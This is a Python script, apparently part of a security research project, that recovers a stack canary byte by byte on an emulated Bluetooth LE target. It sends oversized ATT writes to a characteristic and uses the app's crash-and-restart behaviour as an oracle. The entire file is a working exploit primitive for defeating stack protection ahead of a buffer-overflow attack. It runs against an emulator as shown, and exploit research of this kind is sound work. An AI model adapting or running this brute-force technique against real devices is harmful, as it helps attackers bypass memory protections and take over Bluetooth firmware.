#!/usr/bin/env python3
"""Recover the stack canary of a canary-profile target byte by byte.

Oracle: a value of exactly (canary_start + n) bytes overwrites n canary bytes
and leaves the saved LR alone, so the handler returns normally only when every
guessed byte matches.  A wrong byte aborts the app and the supervisor restarts
it, which is exactly what a crash oracle needs.
"""
from __future__ import annotations

import argparse
import asyncio
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "research"))

from brunel import emulator, protocol  # noqa: E402

ACTION = "00001f20-0000-1000-8000-00805f9b34fb"


async def wait_up(transport: emulator.EmulatorTransport, recovery: float) -> None:
    deadline = asyncio.get_running_loop().time() + recovery
    while asyncio.get_running_loop().time() < deadline:
        if await transport.request_mtu(517) == 517:
            return
        await asyncio.sleep(0.15)
    raise SystemExit("target did not come back")


async def alive(transport: emulator.EmulatorTransport, runs: int, settle: float) -> bool:
    await asyncio.sleep(settle)
    if (await transport.status()).get("runs") != runs:
        return False  # a restart means the guess was wrong
    response = await transport.send_att(protocol.att_read(0x0009), timeout=1.0)
    return bool(response and response[0] == 0x0B)


async def recover(
    transport: emulator.EmulatorTransport,
    handle: int,
    start: int = 256,
    count: int = 4,
    settle: float = 0.2,
    recovery: float = 6.0,
) -> bytes:
    canary = bytearray()
    for index in range(start, start + count):
        for guess in range(256):
            await wait_up(transport, recovery)
            runs = (await transport.status()).get("runs")
            value = b"A" * start + bytes(canary) + bytes([guess])
            await transport.send_att_command(protocol.att_write_command(handle, value))
            if await alive(transport, runs, settle):
                canary.append(guess)
                print(f"byte {index} = 0x{guess:02x}  ({canary.hex()})", flush=True)
                break
        else:
            raise SystemExit(f"no byte matched at {index}")
    return bytes(canary)


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=9200)
    parser.add_argument("--start", type=int, default=256, help="first canary byte index")
    parser.add_argument("--count", type=int, default=4, help="canary width")
    parser.add_argument("--settle", type=float, default=0.35)
    parser.add_argument("--recovery", type=float, default=8.0)
    args = parser.parse_args()

    transport = emulator.EmulatorTransport(port=args.port)
    await transport.open()
    await transport.connect("78:C4:0E:00:00:00")
    handle = await transport.find_handle(ACTION)
    if handle is None:
        raise SystemExit("0x1f20 not found")

    canary = await recover(transport, handle, args.start, args.count, args.settle, args.recovery)
    print("canary", canary.hex())
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
